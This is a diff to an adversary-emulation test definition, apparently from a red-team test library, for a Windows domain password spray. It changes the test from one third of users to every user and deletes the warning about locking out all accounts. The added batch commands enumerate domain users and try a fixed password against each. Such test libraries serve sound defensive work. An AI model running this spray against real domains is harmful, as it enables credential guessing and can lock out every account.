@@ -6,9 +6,8 @@ atomic_tests:
 - name: Domain Password Spray (Windows FOR Loop)
   auto_generated_guid: 09480053-2f98-4854-be6e-71ae5f672224
   description: |
-    This test will attempt to authenticate to a domain controller with the specified password ('Spring2020' by default) for 1/3 of the users in the domain.
+    This test will attempt to authenticate to a domain controller with the specified password ('Spring2020' by default) for every user in the domain.
     Be careful to not lock out user accounts. Use 'net accounts /domain' to review the domain password policy.
-    This test sprays only 1/3 of the domain users to help you avoid a catastrophic lockout of all accounts on the domain.
   supported_platforms:
     - windows
   input_arguments:
@@ -21,4 +20,7 @@ atomic_tests:
     name: command_prompt
     elevation_required: false
     command: |
-      @FOR /F "skip=6" %n in ('net users /domain') do @net use %logonserver%\IPC$ /user:%userdomain%\%n #{password} 1>NUL 2>&1 & @echo|set/p=.  && @echo [*] %n && @net use /delete %logonserver%\IPC$ > NUL
+      rm %temp%\users.txt
+      rem This builds a username list but it doesn't handle user names with spaces correctly
+      @FOR /F "Tokens=1-3 skip=6 USEBACKQ" %a in (`net users /domain ^| findstr /vc:"The command c"`) do @echo %a>>%temp%\users.txt & @echo %b>>%temp%\users.txt & echo %c>>%temp%\users.txt
+      @FOR /F %n in (%temp%\users.txt) do @net use %logonserver%\IPC$ /user:%userdomain%\%n #{password} 1>NUL 2>&1 & @echo|set/p=.  && @echo [*] %n && @net use /delete %logonserver%\IPC$ > NUL
